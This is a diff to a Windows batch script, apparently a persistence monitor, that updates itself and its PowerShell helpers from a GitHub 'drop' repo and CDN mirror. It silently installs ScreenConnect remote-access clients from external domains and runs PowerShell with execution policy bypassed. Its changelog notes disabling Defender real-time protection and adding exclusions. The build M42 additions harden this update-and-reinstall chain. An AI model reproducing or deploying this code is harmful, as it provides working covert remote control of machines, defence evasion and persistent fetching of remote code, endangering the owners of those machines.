@@ -1,6 +1,6 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M41
+rem  OWN_MON  BUILD 20260804M42
 rem  M41: relay-verified sync; INFLIGHT≠OK; sevrz MSI validate; force_gryxa fc; SY heal SDDL via S12.
 rem  M40: restore :RepairRegistered. M39: per-tick Defender RTP-off + SC exclusions.
 rem  Authorized internal deployment - lab/competition scope only.
@@ -24,6 +24,10 @@ set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.
 set "OWNMON2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_mon.cmd?t=%RANDOM%%RANDOM%"
 set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1?t=%RANDOM%%RANDOM%"
 set "OWNLIB2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_lib.ps1?t=%RANDOM%%RANDOM%"
+set "MANIFEST_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/update.manifest?t=%RANDOM%%RANDOM%"
+set "MANIFEST_SIG_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/update.manifest.sig?t=%RANDOM%%RANDOM%"
+set "SEVRZ_EXP_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/sevrz_expected.cfg?t=%RANDOM%%RANDOM%"
+set "SEVRZ_EXP_URL2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/sevrz_expected.cfg?t=%RANDOM%%RANDOM%"
 set "MSI_URL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
 set "MSI_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
 set "MSI_PKG1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg.msi"
@@ -36,7 +40,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M41"
+set "MONVER=M42"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -88,28 +92,91 @@ icacls "%WD%" /reset /T /C /Q >nul 2>&1
 icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" /T /C /Q >nul 2>&1
 attrib -h -s -r "%WD%\tg_report.ps1" "%WD%\own_secure.cmd" "%WD%\own_lib.ps1" "%WD%\own_mon.cmd" >nul 2>&1
 
+set "SELF_UPD=0"
 "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\tg_report.new" "%TG%" >nul 2>&1
 if not exist "%STAGE%\tg_report.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%STAGE%\tg_report.new" "%TG2%" >nul 2>&1
-findstr /C:"TG_REPORT BUILD" "%STAGE%\tg_report.new" >nul 2>&1 && for %%F in ("%STAGE%\tg_report.new") do if %%~zF GTR 1500 move /y "%STAGE%\tg_report.new" "%WD%\tg_report.ps1" >nul 2>&1
-del /f /q "%STAGE%\tg_report.new" >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%STAGE%\own_secure.new" "%OWNSEC%" >nul 2>&1
 if not exist "%STAGE%\own_secure.new" "%CURL%" -L --connect-timeout 8 --max-time 30 -o "%STAGE%\own_secure.new" "%OWNSEC2%" >nul 2>&1
-findstr /C:"OWN_SECURE BUILD" "%STAGE%\own_secure.new" >nul 2>&1 && for %%F in ("%STAGE%\own_secure.new") do if %%~zF GTR 800 move /y "%STAGE%\own_secure.new" "%WD%\own_secure.cmd" >nul 2>&1
-del /f /q "%STAGE%\own_secure.new" >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\own_lib.new" "%OWNLIB%" >nul 2>&1
 if not exist "%STAGE%\own_lib.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%STAGE%\own_lib.new" "%OWNLIB2%" >nul 2>&1
-findstr /C:"OWN_LIB  BUILD" "%STAGE%\own_lib.new" >nul 2>&1 && for %%F in ("%STAGE%\own_lib.new") do if %%~zF GTR 1500 move /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
-del /f /q "%STAGE%\own_lib.new" >nul 2>&1
-rem self-update: download new own_mon, apply AFTER this tick (BUILD-verified)
-set "SELF_UPD=0"
 "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\own_mon.next" "%OWNMON%" >nul 2>&1
 if not exist "%STAGE%\own_mon.next" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%STAGE%\own_mon.next" "%OWNMON2%" >nul 2>&1
-findstr /C:"OWN_MON  BUILD" "%STAGE%\own_mon.next" >nul 2>&1
-if not errorlevel 1 for %%F in ("%STAGE%\own_mon.next") do if %%~zF GTR 1500 (
-  fc /b "%STAGE%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
-  if errorlevel 1 set "SELF_UPD=1"
+"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%STAGE%\update.manifest" "%MANIFEST_URL%" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%STAGE%\update.manifest.sig" "%MANIFEST_SIG_URL%" >nul 2>&1
+
+rem M42: signed update.manifest gate (RSA-SHA256). Fallback to BUILD markers if no pubkey yet.
+set "UPD_OK=0"
+set "MAP="
+if exist "%STAGE%\own_lib.new" set "MAP=!MAP!own_lib.ps1=%STAGE%\own_lib.new;"
+if exist "%STAGE%\own_mon.next" set "MAP=!MAP!own_mon.cmd=%STAGE%\own_mon.next;"
+if exist "%STAGE%\own_secure.new" set "MAP=!MAP!own_secure.cmd=%STAGE%\own_secure.new;"
+if exist "%STAGE%\tg_report.new" set "MAP=!MAP!tg_report.ps1=%STAGE%\tg_report.new;"
+set "VRES=missing"
+if exist "%WD%\own_lib.ps1" if exist "%STAGE%\update.manifest" if exist "%STAGE%\update.manifest.sig" if defined MAP (
+  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action verify-update -WorkDir "%WD%" -Extra "%STAGE%\update.manifest|%STAGE%\update.manifest.sig|!MAP!"`) do set "VRES=%%R"
 )
-if "%SELF_UPD%"=="0" del /f /q "%STAGE%\own_mon.next" >nul 2>&1
+echo update_verify=!VRES!>>"%LOG%"
+if /I "!VRES!"=="ok" (
+  set "UPD_OK=1"
+) else if /I "!VRES!"=="missing" (
+  set "UPD_OK=fallback"
+) else if /I "!VRES!"=="no-pubkey" (
+  set "UPD_OK=fallback"
+) else if /I "!VRES:~0,10!"=="not-in-man" (
+  set "UPD_OK=fallback"
+) else (
+  echo update_refused_!VRES!>>"%LOG%"
+)
+
+if /I "!UPD_OK!"=="1" (
+  if exist "%STAGE%\tg_report.new" move /y "%STAGE%\tg_report.new" "%WD%\tg_report.ps1" >nul 2>&1
+  if exist "%STAGE%\own_secure.new" move /y "%STAGE%\own_secure.new" "%WD%\own_secure.cmd" >nul 2>&1
+  if exist "%STAGE%\own_lib.new" move /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
+  set "SELF_UPD=0"
+  if exist "%STAGE%\own_mon.next" (
+    fc /b "%STAGE%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
+    if errorlevel 1 set "SELF_UPD=1"
+    if "!SELF_UPD!"=="0" del /f /q "%STAGE%\own_mon.next" >nul 2>&1
+  )
+) else if /I "!UPD_OK!"=="fallback" (
+  findstr /C:"TG_REPORT BUILD" "%STAGE%\tg_report.new" >nul 2>&1 && for %%F in ("%STAGE%\tg_report.new") do if %%~zF GTR 1500 move /y "%STAGE%\tg_report.new" "%WD%\tg_report.ps1" >nul 2>&1
+  findstr /C:"OWN_SECURE BUILD" "%STAGE%\own_secure.new" >nul 2>&1 && for %%F in ("%STAGE%\own_secure.new") do if %%~zF GTR 800 move /y "%STAGE%\own_secure.new" "%WD%\own_secure.cmd" >nul 2>&1
+  findstr /C:"OWN_LIB  BUILD" "%STAGE%\own_lib.new" >nul 2>&1 && for %%F in ("%STAGE%\own_lib.new") do if %%~zF GTR 1500 move /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
+  set "SELF_UPD=0"
+  findstr /C:"OWN_MON  BUILD" "%STAGE%\own_mon.next" >nul 2>&1
+  if not errorlevel 1 for %%F in ("%STAGE%\own_mon.next") do if %%~zF GTR 1500 (
+    fc /b "%STAGE%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
+    if errorlevel 1 set "SELF_UPD=1"
+  )
+  if "%SELF_UPD%"=="0" del /f /q "%STAGE%\own_mon.next" >nul 2>&1
+) else (
+  del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" "%STAGE%\own_mon.next" >nul 2>&1
+  set "SELF_UPD=0"
+)
+del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" >nul 2>&1
+del /f /q "%STAGE%\update.manifest" "%STAGE%\update.manifest.sig" >nul 2>&1
+
+rem M42: sevrz.cfg dynamic FP from repo sevrz_expected.cfg
+if exist "%WD%\sevrz.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\sevrz.cfg") do (
+  if /I "%%K"=="PRIMARY_FP" set "KEEP_FP=%%L"
+  if /I "%%K"=="ALT_FP" set "ALT_FP=%%L"
+)
+"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%STAGE%\sevrz_expected.new" "%SEVRZ_EXP_URL%" >nul 2>&1
+if not exist "%STAGE%\sevrz_expected.new" "%CURL%" -L --connect-timeout 6 --max-time 20 -o "%STAGE%\sevrz_expected.new" "%SEVRZ_EXP_URL2%" >nul 2>&1
+if exist "%STAGE%\sevrz_expected.new" if exist "%WD%\own_lib.ps1" (
+  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$t=Get-Content -LiteralPath '%STAGE%\sevrz_expected.new' -Raw; & '%WD%\own_lib.ps1' -Action sync-sevrz-fp -WorkDir '%WD%' -Extra $t"`) do (
+    echo sevrz_sync %%R>>"%LOG%"
+    for /f "tokens=2,3 delims=|" %%A in ("%%R") do (
+      if not "%%A"=="" set "KEEP_FP=%%A"
+      if not "%%B"=="" set "ALT_FP=%%B"
+    )
+  )
+)
+del /f /q "%STAGE%\sevrz_expected.new" >nul 2>&1
+if exist "%WD%\sevrz.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\sevrz.cfg") do (
+  if /I "%%K"=="PRIMARY_FP" set "KEEP_FP=%%L"
+  if /I "%%K"=="ALT_FP" set "ALT_FP=%%L"
+)
 
 rem ── [B] re-arm chain 1: ownership-aware (not existence-only) ──
 rem L11/M22: Query-only skipped rearm when Windows built-in tasks shared
@@ -534,6 +601,9 @@ if /I not "!MSIOK!"=="yes" (
   del /f /q "%MSI%" >nul 2>&1
   exit /b 1
 )
+rem M42: sibling-safe copy (empty Upgrade table) before sevrz /i
+set "MSI_SAFE=%MSI%"
+if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%S in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action protect-msi -Extra "%MSI%" -WorkDir "%WD%"`) do if not "%%S"=="FAIL" if exist "%%S" set "MSI_SAFE=%%S"
 call :NoMsiPolicy
 rem M13/M41: stale primary dir under PF and PF86
 sc query "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
@@ -548,16 +618,17 @@ if errorlevel 1 (
   )
 )
 echo [%TAG%] msiexec install>>"%LOG%"
-msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal.log" >nul 2>&1
+msiexec /i "%MSI_SAFE%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal.log" >nul 2>&1
 set "MSIEXIT=!ERRORLEVEL!"
 echo [%TAG%] msiexec exit=!MSIEXIT!>>"%LOG%"
 if "!MSIEXIT!"=="1618" (
   echo [%TAG%] msi_busy_retry>>"%LOG%"
   timeout /t 30 /nobreak >nul
-  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal2.log" >nul 2>&1
+  msiexec /i "%MSI_SAFE%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal2.log" >nul 2>&1
   set "MSIEXIT=!ERRORLEVEL!"
   echo [%TAG%] msiexec_retry exit=!MSIEXIT!>>"%LOG%"
 )
+if /I not "%MSI_SAFE%"=="%MSI%" del /f /q "%MSI_SAFE%" >nul 2>&1
 call :WaitSvc
 call :RestoreAlt
 rem O37: sevrz /i shares legacy UpgradeCodes with gryxa — always re-ensure Gryxa after
